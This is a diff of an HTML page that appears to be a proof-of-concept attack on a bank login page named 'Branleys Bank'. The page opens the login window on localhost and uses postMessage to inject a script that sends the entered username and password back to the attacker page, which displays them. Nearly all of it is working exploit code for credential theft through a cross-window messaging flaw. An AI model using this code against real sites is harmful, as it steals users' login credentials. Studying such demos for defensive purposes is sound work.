@@ -1,5 +1,46 @@
 <html>
     <body>
-        <h1>Boom!</h1>
+        <h1>Don't Trust Branleys Bank</h1>
+
+        <p>Branleys Bank has some of the worst security in the world, click below and I can steal your credentials</p>
+
+        <button id="h">Hack It</button>
+        <button id="y">Y</button>
+
+
+        <p>
+            <div><strong>Username:</strong> <span id="u"></span></div>
+            <div><strong>Password:</strong> <span id="p"></span></div>
+        </p>
+
+        <script>
+            document.getElementById("h").addEventListener("click", execute_hack);
+
+            var script = "";
+            script += 'function send() { window.opener.postMessage({ "u" : document.getElementById("username").value, "p":  document.getElementById("password").value }, "http://127.0.0.1:81/") }'
+            script += 'document.getElementById("username").addEventListener("change", send);'
+            script += 'document.getElementById("password").addEventListener("change", send);'
+            
+            var windowRef;
+
+            function execute_hack() {
+                //var windowRef = window.open('https://branleys.com/login.html');
+                windowRef = window.open('http://127.0.0.1/login.html');
+                
+            }
+
+            document.getElementById("y").addEventListener("click", sendM);
+            function sendM() {
+                windowRef.postMessage(script, "http://127.0.0.1/");
+            }
+
+            window.addEventListener("message", receiveMessage, false);
+            function receiveMessage(event) {
+                console.log(event);
+
+                document.getElementById("u").innerHTML = event.data.u;
+                document.getElementById("p").innerHTML = event.data.p;
+            }
+        </script>
     </body>
 </html>
